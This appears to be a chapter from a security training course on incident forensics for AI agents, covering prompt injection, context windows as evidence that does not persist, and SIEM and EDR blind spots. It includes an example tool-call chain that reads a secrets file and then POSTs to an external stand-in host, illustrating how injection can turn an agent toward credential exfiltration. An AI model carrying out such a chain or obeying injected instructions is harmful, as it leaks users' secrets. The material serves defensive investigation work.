# Chapter 14 — The Agent Forensics Problem: Why Standard IR Misses Agent Incidents

## What You Will Learn

This chapter identifies the specific ways that AI agent incidents differ from traditional security incidents and explains why applying standard incident response methodologies to agent incidents produces incomplete investigations. You will understand the structural gaps in conventional SIEM and EDR tooling when applied to LLM-based agents, learn why agent incidents often present as legitimate-looking activity, and build the conceptual framework needed to adapt your IR process to agent environments before you encounter your first agent incident.

## Why This Matters

Standard incident response was designed for a world where actions leave process trees, file system artifacts, and network connections. An agent working through a tool-calling API leaves none of these in the traditional sense. It emits structured API calls — which may be indistinguishable from legitimate use — and its reasoning state lives entirely in a context window that is never persisted to disk by default.

When an agent is manipulated by a prompt injection and exfiltrates data by calling a legitimate file-access tool followed by a legitimate network-egress tool, a SIEM alert on "unusual data transfer" may not fire at all. Each individual action conforms to policy. The harm is in the sequence and the authorization basis — and reconstructing both is a fundamentally different forensic problem.

## Key Concepts

### Non-Determinism and Reproducibility in Agent Incidents

Traditional incident reconstruction assumes that given the same inputs and environment, you can reproduce the sequence of events. With LLM agents, this assumption fails. The same prompt, the same tool set, and the same environmental context will not necessarily produce the same tool call sequence on replay, because model outputs are probabilistic.

This has two forensic consequences:
1. You cannot definitively reproduce what the agent did by re-running it. You can only examine what it actually did record of.
2. An attacker who understands this property can craft injections that produce harmful behavior intermittently — making the attack harder to reproduce and therefore harder to attribute.

### The Context Window as Ephemeral Evidence

The context window — the full conversation history, system prompt, tool definitions, tool call results, and model reasoning — is the most important forensic artifact in an agent incident. It is also the one artifact that is almost never preserved by default.

Most LLM runtime implementations:
- Do not persist the context window to durable storage
- Do not log tool call inputs and outputs at the message level
- Do not associate individual tool calls with the system prompt version that was in effect at the time

When the agent process terminates, this evidence is gone. Reconstructing what the agent was "thinking" requires correlating downstream artifacts: tool call API logs, tool execution logs in the systems the agent interacted with, and any output the agent produced.

### Tool Call Chains vs. Traditional Process Trees

Standard forensic investigation of compromised systems follows process trees: parent process → child process → file write → network connection. The causality is encoded in OS-level process metadata.

Agent forensics must work with tool call chains — sequences of API-level invocations where causality is encoded only in temporal correlation and the agent's session context. A tool call chain might look like:

```
[10:42:01] read_file(path="/config/database.yaml")
[10:42:03] read_file(path="/secrets/api_key.txt")
[10:42:05] http_request(url="https://external-service.example.com/upload", method="POST", body="...")
```

This chain may represent legitimate behavior (the agent pulling config to configure an integration) or data exfiltration (the agent responding to a prompt injection instruction to exfiltrate credentials). The tool call log alone cannot distinguish the two. The investigator must correlate the tool call chain with the agent's instruction context and authorization policy at the time of execution.

### Lack of Standard Forensic Artifacts in LLM Runtimes

When investigating a compromised Linux host, a set of standard artifacts is available: system call traces, file system metadata, network connection tables, process memory dumps, shell history. No equivalent standard exists for LLM agent runtimes. There is no "ps" for agent sessions, no strace for tool calls, no netstat for agent-initiated connections.

Each agent framework — LangChain, AutoGPT, Claude's tool_use API, custom implementations — produces different logging output. Many produce no structured logging by default. Forensic investigation of an agent incident in a framework with insufficient logging is analogous to investigating a compromised server with syslog disabled: possible in principle, but significantly constrained.

### Agent Session Boundaries and Their Forensic Significance

An agent session is the unit of agent execution: a bounded sequence of reasoning steps and tool calls initiated by a single invocation and concluded when the agent reaches a terminal state. Session boundaries are forensically significant because:

- Authorization policies may change between sessions (the agent has different permissions in session N+1 than in session N)
- The injected system prompt may change between sessions
- A prompt injection that successfully manipulates one session may not affect the next, depending on the injection vector

Investigators must determine whether the incident occurred within a single session or spanned session boundaries, because this affects both the scope of the investigation and the evidence correlation strategy.

### The Prompt-as-Evidence Problem

In traditional IR, the "attack payload" is a binary or a script — an artifact that can be examined, hashed, and attributed. In agent incidents, the attack payload is often a prompt injection embedded in user-controlled input, a document the agent read, or a tool call result.

The prompt injection payload:
- Is text, not binary
- May be embedded in otherwise legitimate content (a pull request description, a support ticket, a README)
- Does not persist as a separate artifact — it exists in the context window at the time of the attack and then is gone
- May not look anomalous to a human reviewer without understanding its effect in the model's context

Preserving prompt injections as forensic evidence requires capturing the agent's full input context, including all content that was in the context window when the manipulation occurred.

### Gaps in Standard SIEM and EDR Visibility for Agent Actions

| Visibility category | Standard SIEM/EDR coverage | Agent incident coverage |
|---|---|---|
| Process execution | High — process tree, command line | None — agents use API calls, not processes |
| File system access | High — inotify, audit subsystem | Partial — only if agent uses OS file APIs |
| Network connections | High — socket creation, DNS | Partial — only outbound HTTP from agent process |
| Authentication events | High — PAM, Kerberos, OAuth | Low — agent uses API keys or OIDC tokens, often not logged per-call |
| Authorization decisions | Medium — application-specific | Very low — agent tool authorization is rarely logged with decision context |
| Semantic intent | None | None — SIEM cannot determine what the agent was instructed to do |

The semantic intent gap is the most significant. A SIEM can alert on an unusual API call pattern. It cannot determine whether the agent executed that API call in response to a legitimate user instruction or in response to an injected instruction from a malicious document. Closing this gap requires preserving the agent's instruction context alongside the tool call record.

## Framework Reference

`forensics-and-incident-response-framework/docs/agent-forensics.md`

## Hands-On Lab

→ [Lab: Identifying Agent Forensics Evidence Gaps](lab/README.md)
